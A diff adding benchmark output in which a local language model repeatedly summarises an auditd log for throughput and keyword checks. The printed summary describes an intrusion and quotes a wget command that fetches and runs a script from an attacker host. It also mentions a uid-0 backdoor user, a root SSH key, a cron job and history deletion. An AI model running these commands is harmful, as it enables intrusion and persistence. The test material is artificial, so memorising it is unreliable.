@@ -1,0 +1,55 @@
+Starting benchmark...
+Health Check
+Health check passed: http://127.0.0.1:8080/
+model: unsloth/gpt-oss-20b-GGUF:Q4_K_M  n_ctx: 32768  mode: summary  temperature: 0.7  think: False  max_tokens: 1024
+warm-up ...
+
+log: out_audit/audit.log（67 行、13,729 文字）
+run1-1: 入力 5707 tok   947.4 tok/s | 生成 378 tok  26.4 tok/s | 計   20.3 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': False, 'sysupd': True}
+run1-2: 入力 5707 tok  1160.4 tok/s | 生成 398 tok  33.3 tok/s | 計   16.8 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run1-3: 入力 5707 tok   664.6 tok/s | 生成 348 tok  20.2 tok/s | 計   25.8 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run1-4: 入力 5707 tok  1357.3 tok/s | 生成 500 tok  20.7 tok/s | 計   28.3 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+  → 全員が終わるまで 29.6 s、全体の生成量 54.8 tok/s（入力処理の時間を含む）
+run2-1: 入力 5707 tok   954.0 tok/s | 生成 613 tok  31.0 tok/s | 計   25.7 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run2-2: 入力 5707 tok  1356.7 tok/s | 生成 463 tok  17.6 tok/s | 計   30.5 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run2-3: 入力 5707 tok   965.8 tok/s | 生成 375 tok  21.2 tok/s | 計   23.6 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run2-4: 入力 5707 tok  1198.4 tok/s | 生成 512 tok  33.4 tok/s | 計   20.1 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+  → 全員が終わるまで 32.8 s、全体の生成量 59.8 tok/s（入力処理の時間を含む）
+run3-1: 入力 5707 tok   965.0 tok/s | 生成 613 tok  26.0 tok/s | 計   29.5 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-2: 入力 5707 tok  1364.3 tok/s | 生成 382 tok  17.2 tok/s | 計   26.4 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-3: 入力 5707 tok  1200.4 tok/s | 生成 735 tok  41.8 tok/s | 計   22.3 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+run3-4: 入力 5707 tok   960.9 tok/s | 生成 589 tok  32.1 tok/s | 計   24.2 s | stop | {'attacker_ip': True, 'account': True, 'c2_ip': True, 'sysupd': True}
+  → 全員が終わるまで 33.9 s、全体の生成量 68.5 tok/s（入力処理の時間を含む）
+
+===== 結果（中央値）
+入力処理: 1063.1 tok/s
+生成:     26.2 tok/s（1人あたり。最小 17.2）
+1回の時間: 25.0 s
+4 人全員が終わるまで: 32.8 s
+
+----- 回答（最後の回）
+**Summary of the auditd log**
+
+- **Failed root SSH attempts** – The first several entries show multiple `sshd` login attempts from 203.0.113.45 as the `root` account. All of them failed authentication (`res=failed`).
+
+- **Successful login as user “backup”** – An SSH session is opened for the account *backup* from the same IP. The session is granted via PAM (`pam_loginuid,pam_unix`) and a new login session (`ses=2`) is created.
+
+- **Execution of commands via sudo** – The *backup* user runs several commands with `sudo`.  
+  * `id`, `uname`, `cat /etc/passwd` – simple information gathering.  
+  * `wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh` – downloads a script from an external host.  
+  * `chmod +x /tmp/.upd.sh` – makes the script executable.  
+  * `bash /tmp/.upd.sh` – runs the downloaded script.
+
+- **What the script does** – The script:
+  1. Creates a new system user `sysupd` (uid/gid 0, home `/root`, shell `/bin/bash`).  
+  2. Adds an `authorized_keys` entry under `/root/.ssh/` – effectively installing a new SSH key for the root account.  
+  3. Creates a cron job `/etc/cron.d/sysupd` (the audit log notes a `bash` command with key `cron`).  
+  4. Attempts a network connection that fails (`syscall=42 exit=-115`).
+
+- **Cleanup** – The script removes the backup user’s shell history (`rm /home/backup/.bash_history`) before the session ends.
+
+- **Session termination** – The backup user logs out (`PAM:session_close`), and the SSH session ends successfully.
+
+**Conclusion:** The audit log records an initial failed root login, a successful login as the `backup` user, use of `sudo` to download and run a malicious script, creation of a new privileged user (`sysupd`), installation of an SSH key for root, and cleanup of traces. The system was compromised through a compromised user account that leveraged sudo privileges to install a backdoor.
+
+saved: audit_bench_results.csv（12 行追記）
